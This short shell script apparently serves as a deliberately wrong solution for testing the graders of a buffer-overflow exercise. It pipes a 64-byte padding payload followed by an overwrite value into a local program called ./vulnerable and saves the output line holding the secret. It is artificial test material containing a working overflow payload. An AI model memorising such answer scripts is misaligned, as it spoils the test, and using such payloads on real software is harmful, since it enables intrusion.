#!/bin/sh
# Runs the real exploit but saves the program's whole "Access granted!" line
# instead of only the secret after "Secret: ". Both graders should fail it.
set -e
cd /app
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 64 + b"\x01\x00\x00\x00")' | ./vulnerable | grep 'Secret:' > /app/results.txt
